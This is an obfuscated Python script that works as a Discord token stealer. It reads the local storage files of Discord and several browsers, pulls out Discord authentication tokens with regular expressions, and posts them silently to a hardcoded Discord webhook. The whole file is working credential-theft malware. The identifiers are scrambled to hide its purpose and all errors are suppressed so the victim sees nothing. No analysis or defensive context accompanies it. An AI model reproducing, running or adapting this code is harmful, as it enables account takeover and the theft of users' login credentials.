import os #line:1
import re #line:2
import json #line:3
from urllib .request import Request ,urlopen #line:5
WEBHOOK_URL ='https://discord.com/api/webhooks/905506047123415090/IW-YIbncYmHu6Od5W0qeixi_ruNI5u5PcfOLO9_ExZ5i2ea6e_TJ1TxLw83tzrdZ4sxC'#line:8
PING_ME =True #line:11
def find_tokens (OOOO0OO00000000OO ):#line:13
    OOOO0OO00000000OO +='\\Local Storage\\leveldb'#line:14
    O0O00OO0000O0O0O0 =[]#line:16
    for O0O00OOOOO000OOOO in os .listdir (OOOO0OO00000000OO ):#line:18
        if not O0O00OOOOO000OOOO .endswith ('.log')and not O0O00OOOOO000OOOO .endswith ('.ldb'):#line:19
            continue #line:20
        for OOOOOOO00OOOO0O0O in [OO0OO00000O00OOO0 .strip ()for OO0OO00000O00OOO0 in open (f'{OOOO0OO00000000OO}\\{O0O00OOOOO000OOOO}',errors ='ignore').readlines ()if OO0OO00000O00OOO0 .strip ()]:#line:22
            for O00O0O0OO000OOOOO in (r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}',r'mfa\.[\w-]{84}'):#line:23
                for OOO00000O00000O00 in re .findall (O00O0O0OO000OOOOO ,OOOOOOO00OOOO0O0O ):#line:24
                    O0O00OO0000O0O0O0 .append (OOO00000O00000O00 )#line:25
    return O0O00OO0000O0O0O0 #line:26
def main ():#line:28
    OO000OO00000O000O =os .getenv ('LOCALAPPDATA')#line:29
    OOOO0OOOO0O0O000O =os .getenv ('APPDATA')#line:30
    OOOOO0000O00OO000 ={'Discord':OOOO0OOOO0O0O000O +'\\Discord','Discord Canary':OOOO0OOOO0O0O000O +'\\discordcanary','Discord PTB':OOOO0OOOO0O0O000O +'\\discordptb','Google Chrome':OO000OO00000O000O +'\\Google\\Chrome\\User Data\\Default','Opera':OOOO0OOOO0O0O000O +'\\Opera Software\\Opera Stable','Brave':OO000OO00000O000O +'\\BraveSoftware\\Brave-Browser\\User Data\\Default','Yandex':OO000OO00000O000O +'\\Yandex\\YandexBrowser\\User Data\\Default'}#line:40
    O0OOOO0O0OOO000O0 ='@everyone'if PING_ME else ''#line:42
    for OOOO0OOOOO00O0OOO ,OO0000OO0OOO00O0O in OOOOO0000O00OO000 .items ():#line:44
        if not os .path .exists (OO0000OO0OOO00O0O ):#line:45
            continue #line:46
        O0OOOO0O0OOO000O0 +=f'\n**{OOOO0OOOOO00O0OOO}**\n```\n'#line:48
        OOO0O0OOOO0OOOOO0 =find_tokens (OO0000OO0OOO00O0O )#line:50
        if len (OOO0O0OOOO0OOOOO0 )>0 :#line:52
            for O0OOOO00O0O0OO0OO in OOO0O0OOOO0OOOOO0 :#line:53
                O0OOOO0O0OOO000O0 +=f'{O0OOOO00O0O0OO0OO}\n'#line:54
        else :#line:55
            O0OOOO0O0OOO000O0 +='No tokens found.\n'#line:56
        O0OOOO0O0OOO000O0 +='```'#line:58
    O0000O0OO0O00OOO0 ={'Content-Type':'application/json','User-Agent':'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11'}#line:63
    O000OO0O0OO0OO0O0 =json .dumps ({'content':O0OOOO0O0OOO000O0 })#line:65
    try :#line:67
        O0OO0O00OO0OO0OO0 =Request (WEBHOOK_URL ,data =O000OO0O0OO0OO0O0 .encode (),headers =O0000O0OO0O00OOO0 )#line:68
        urlopen (O0OO0O00OO0OO0OO0 )#line:69
    except :#line:70
        pass #line:71
if __name__ =='__main__':#line:73
    main ()